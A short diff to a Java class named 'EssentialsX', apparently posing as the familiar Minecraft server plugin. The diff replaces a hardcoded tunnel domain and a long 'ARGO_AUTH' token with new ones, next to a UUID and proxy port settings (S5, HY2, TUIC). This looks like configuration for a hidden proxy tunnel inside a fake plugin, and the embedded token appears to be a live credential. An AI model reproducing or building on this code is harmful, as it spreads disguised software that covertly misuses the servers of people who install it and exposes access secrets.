@@ -76,8 +76,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "freemcserver.zdsa.us.kg");
-        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiYzUxMWU4MTgtYjJlYS00ODdmLTk1MzUtOGE0MTljMWQ2OGE4IiwicyI6Ik5UVmxObUpqT0dNdE1URXlZeTAwT1RVeExXSm1ZV010WmpRd1pXUmxZekJtWWpWaCJ9");
+        env.put("ARGO_DOMAIN", "minecraft-hoster.zdsa.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiZGQ0YzY3NDYtNDE2Ni00MTE0LWJhOWMtYmI3ZjI5OGQyZGJhIiwicyI6Ik1USmhZVGxrTVRFdE9Ea3dPUzAwWTJJMExUaGxZV0l0WVdOa01XTXdaamxsTW1RMiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
